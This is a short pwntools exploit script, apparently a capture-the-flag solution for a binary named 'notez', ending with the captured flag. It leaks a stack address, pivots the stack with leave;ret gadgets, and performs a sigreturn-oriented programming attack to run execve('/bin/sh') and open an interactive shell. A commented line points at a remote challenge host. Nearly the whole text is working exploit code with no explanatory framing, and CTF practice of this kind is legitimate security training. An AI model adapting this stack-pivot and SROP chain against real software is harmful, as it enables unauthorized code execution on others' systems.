from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./notez', '''
    b *main+161
    b *main+189
    continue
''')

# p = remote('161.97.155.116', 14337)

POP_RAX_RET = 0x4011da
SYSCALL_RET = 0x4011dc
LEAVE_RET = 0x4012cb

READ_MEMCPY_FPRINTF = 0x40126c
FPRINTF = 0x4012a4

# 1. get current rbp value
p.recvuntil(b"Here's a quick walkthrough: ")
current_rbp_val = int(p.recvline().strip(), 16)+0x4
log.info(f"current rbp value: {hex(current_rbp_val)}")

# 2. stack pivot for another payload
p.send(p64(current_rbp_val)+p64(READ_MEMCPY_FPRINTF)+b'A'*0xc+p32(0x150)+p64(current_rbp_val-0x20+0x8-0x8)+p64(LEAVE_RET)) # rbp=current_rbp_val-0x20, rsp=current_rbp_val-0x18

# 3. perform SROP to trigger execve('/bin/sh\x00', NULL, NULL)
frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = current_rbp_val-0x20+0x10
frame.rsi = 0
frame.rdx = 0
frame.rsp = current_rbp_val-0x20
frame.rip = SYSCALL_RET
p.send(b'A'*0x8+p64(FPRINTF)+b'/bin/sh\x00'+b'A'*0x10+p64(POP_RAX_RET)+p64(0xf)+p64(SYSCALL_RET)+bytes(frame))

p.interactive()

# QnQSec{s0rry_4b0ut_th3_cr45h3z_w3_w1ll_r3p0r7_2_t3ch_5upp0r7_4nd_f1r3_th3_4pp_4uth0r}